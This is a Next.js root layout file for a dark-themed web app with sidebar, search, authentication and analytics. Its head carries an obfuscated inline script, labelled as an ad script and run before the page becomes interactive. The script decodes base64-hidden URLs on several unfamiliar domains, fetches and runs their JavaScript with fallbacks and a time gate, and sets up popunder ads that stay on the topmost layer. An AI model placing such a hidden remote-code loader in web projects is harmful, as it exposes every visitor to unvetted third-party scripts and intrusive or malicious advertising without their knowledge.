import type { Metadata } from "next";
import { Inter } from "next/font/google";
import "./globals.css";
import { ThemeProvider } from "@/components/theme-provider";
import { Sidebar } from "@/components/sidebar";
import { SearchCommand } from "@/components/search-command";
import { AuthProvider } from "@/components/auth-provider";
import { UserButton } from "@/components/user-button";
import { Analytics } from "@vercel/analytics/react";
import { metadata as siteMetadata } from "./metadata";
import Script from "next/script";

const inter = Inter({ subsets: ["latin"] });

export const metadata: Metadata = siteMetadata;

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en" suppressHydrationWarning>
      <head>
        <Script
          id="ad-script"
          strategy="beforeInteractive"
          dangerouslySetInnerHTML={{
            __html: `/*<![CDATA[/* */
(function(){var l=window,a="e441f630f18f23143211514fa18360c2",g=[["siteId",112*445*51-669+2639021],["minBid",0.0005],["popundersPerIP","4:1,3:1"],["delayBetween",20],["default","dHJ1ZQ=="],["defaultPerDay",7],["topmostLayer","always"]],u=["d3d3LnhhZHNtYXJ0LmNvbS9icHlOL2UvdWVtYmVkLm1pbi5qcw==","ZDExZW5xMnJ5bXkweWwuY2xvdWRmcm9udC5uZXQveHhpdmVseWpzLm1pbi5qcw==","d3d3Lm9qaG5pZXdkd3RpdXFkLmNvbS9LR1BlYXgvU3UvcGVtYmVkLm1pbi5qcw==","d3d3LnFheWZldXloaWFsLmNvbS9keGl2ZWx5anMubWluLmpz"],z=-1,v,f,d=function(){clearTimeout(f);z++;if(u[z]&&!(1766937191000<(new Date).getTime()&&1<z)){v=l.document.createElement("script");v.type="text/javascript";v.async=!0;var t=l.document.getElementsByTagName("script")[0];v.src="https://"+atob(u[z]);v.crossOrigin="anonymous";v.onerror=d;v.onload=function(){clearTimeout(f);l[a.slice(0,16)+a.slice(0,16)]||d()};f=setTimeout(d,5E3);t.parentNode.insertBefore(v,t)}};if(!l[a]){try{Object.freeze(l[a]=g)}catch(e){}d()}})();
/*]]>/* */`,
          }}
        />
      </head>
      <body
        className={`${inter.className} bg-gradient-to-br from-gray-900 to-black text-white`}
      >
        <AuthProvider>
          <ThemeProvider
            attribute="class"
            defaultTheme="dark"
            enableSystem={false}
          >
            <div className="flex h-screen overflow-hidden">
              <Sidebar />
              <main className="flex-1 overflow-auto">
                <header className="sticky top-0 z-10 backdrop-blur-md bg-black/30 border-b border-gray-800">
                  <div className="container mx-auto px-4 py-4 flex justify-between items-center">
                    <SearchCommand />
                    <UserButton />
                  </div>
                </header>
                <div className="container mx-auto px-4 py-8">{children}</div>
              </main>
            </div>

            <Analytics />
          </ThemeProvider>
        </AuthProvider>
      </body>
    </html>
  );
}
